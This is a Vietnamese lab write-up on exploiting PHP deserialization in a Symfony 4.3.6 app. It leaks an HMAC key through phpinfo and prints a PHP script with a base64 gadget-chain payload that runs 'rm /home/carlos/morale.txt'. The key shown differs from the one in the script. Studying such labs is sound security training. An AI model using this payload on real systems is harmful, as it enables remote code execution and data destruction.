# Exploiting PHP deserialization with a pre-built gadget chain

Google search:

![image](https://user-images.githubusercontent.com/68894302/178090048-5e04fcb0-3d70-405e-ae89-61dd6188ff48.png)

![image](https://user-images.githubusercontent.com/68894302/178090061-11a5d366-78dc-44c1-92e3-d52b918953af.png)

Công cụ này giúp chúng ta tạo ra payload khi không có source code của trang web. Dựa vào framework ứng dụng đang sử dụng và version để lựa chọn gadget chain phù hợp.

![image](https://user-images.githubusercontent.com/68894302/178090126-40525e27-9b04-4e87-8307-fa5ddfd87dbd.png)

Bây giờ tiến hành truy cập vào challenge. Có lẽ cookie vẫn là điểm chúng ta có thể control để khai thác

![image](https://user-images.githubusercontent.com/68894302/178090259-5bf02598-d4f8-410e-a897-7adf1ff054cf.png)

Chúng ta có:

+ token: chứa thông tin serialization của đối tượng User

  ![image](https://user-images.githubusercontent.com/68894302/178090321-d0116938-8016-494a-a1c8-e07fe12d6428.png)

+ sig_hmac_sha1: tạo giá trị băm bằng method HMAC sử dụng thuật toán sha1

  ![image](https://user-images.githubusercontent.com/68894302/178090395-8fdd00f9-1411-4973-9e2c-851418bba38b.png)

​		$data ở đây chúng ta có thể thay thế bằng giá trị của token ở trên, còn key thì sao?

Key sẽ được lấy ở file `/cgi-bin/phpinfo.php`, vì thông thường secret_key thường được lưu trữ ở đó

![image](https://user-images.githubusercontent.com/68894302/178090493-5873907f-a922-4930-9bcf-31d3714791d9.png)

![image](https://user-images.githubusercontent.com/68894302/178090525-56584dd7-1a95-4ddd-a418-35545aa3124d.png)

Ok đã có được key là: v0iqg0nzu4wqfleugr5hkcjoz97xaiik. Quay trở lại với phần token, làm thế nào để biết được framework hay một số thông tin mà ứng dụng sử dụng? Thông thường cách dễ dàng nhất là làm cho server phản hồi lỗi. Thử thay thế tên người dùng bằng tuandv:

![image](https://user-images.githubusercontent.com/68894302/178090659-f60a3aa6-e7a0-4a4e-a4f4-543204a205ce.png)

Server phản hồi 500 error và quan sát thấy framework được dùng là Symfony ver 4.3.6

![image](https://user-images.githubusercontent.com/68894302/178090753-0516bd3f-d90b-4ede-81a3-fbd113774ca5.png)

Từ đây chúng ta có thể dễ dàng gen payload dựa vào gadget chain sẵn có, với phiên bản 4.3.6 của Symfony chúng ta sẽ dùng gadget Symfony/RCE4

![image](https://user-images.githubusercontent.com/68894302/178090845-dceee105-9f82-4c4c-b076-b8c182a4d256.png)

![image](https://user-images.githubusercontent.com/68894302/178090902-7b17a117-105c-40d3-b9c3-8126621b0e37.png)

Decode xem cấu trúc đối tượng này như thế nào:

![image-20220709110806651](C:/Users/tuandv/AppData/Roaming/Typora/typora-user-images/image-20220709110806651.png)

Viết script sau kết hợp token và sig_hmac_sha1 để tạo cookie:

``` php+HTML
<?php
$object = 'Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==';
$secret_key = "ugfmd2m7k2u0vqi9w2pivd9vncewh53o";
$cookie = urlencode('{"token":"'.$object.'","sig_hmac_sha1":"'.hash_hmac('sha1', $object, $secret_key).'"}');
echo $cookie;
```

Nhận được giá trị của cookie, thay thế vào cookie cũ và file /home/carlos/morale.txt được xóa <-> challenge được solved.

![image](https://user-images.githubusercontent.com/68894302/178091214-e383d4ae-3c51-44b3-a79a-ed25ec6aaedd.png)